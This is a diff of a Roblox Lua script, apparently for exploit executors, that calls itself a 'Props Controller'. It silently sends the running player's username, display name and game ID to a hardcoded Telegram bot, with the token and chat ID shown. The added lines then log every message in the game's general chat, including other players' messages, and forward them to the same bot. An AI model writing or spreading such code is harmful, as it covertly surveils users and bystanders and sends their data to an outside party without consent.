@@ -1,29 +1,26 @@
--- 1. Ambil data pemain yang mengeksekusi script
-local player = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
 local playerName = player.Name
 local displayName = player.DisplayName
 
--- 2. KONFIGURASI TELEGRAM BOT (Token yang sudah diperbaiki)
 local botToken = "8896951312:AAExDFPex9etwJ0soNbPRuTeUuyTkradOQY"
 local chatId = "7227168665"
-
--- 3. Siapkan URL dan Pesan Notifikasi
 local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
-local message = "🔔 **Script Executed!**\n\n👤 Username: `" .. playerName .. "`\n🏷️ Display Name: `" .. displayName .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`"
 
--- 4. Siapkan data JSON untuk dikirim
-local HttpService = game:GetService("HttpService")
-local data = {
-    chat_id = chatId,
-    text = message,
-    parse_mode = "Markdown"
-}
-
--- 5. Fungsi pengirim pesan
 local requestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
 
-if requestFunc then
-    -- pcall digunakan agar script tidak error/berhenti jika gagal mengirim
+local function sendTelegram(text)
+    if not requestFunc then return end
+    
+    local data = {
+        chat_id = chatId,
+        text = text,
+        parse_mode = "Markdown"
+    }
+    
     pcall(function()
         requestFunc({
             Url = url,
@@ -34,8 +31,23 @@ if requestFunc then
     end)
 end
 
--- ==========================================
--- ISI SCRIPT UTAMA ANDA DI BAWAH INI
--- ==========================================
-print("Props Controller berhasil dijalankan oleh: " .. playerName)
--- (Masukkan kode auto-farm / script controller Anda di sini)
+local startupMessage = "🔔 *Script Executed & Chat Logger Started!*\n\n👤 Username: `" .. playerName .. "`\n🏷️ Display Name: `" .. displayName .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`"
+sendTelegram(startupMessage)
+
+task.spawn(function()
+    local success, channel = pcall(function()
+        return TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+    end)
+
+    if success and channel then
+        channel.MessageReceived:Connect(function(message)
+            local sender = message.TextSource and message.TextSource.Name or "System"
+            local chatText = message.Text
+            
+            local formattedMessage = string.format("💬 *[%s]* `%s`: %s", playerName, sender, chatText)
+            sendTelegram(formattedMessage)
+        end)
+    end
+end)
+
+print("Props Controller & Chat Logger berhasil dijalankan oleh: " .. playerName)
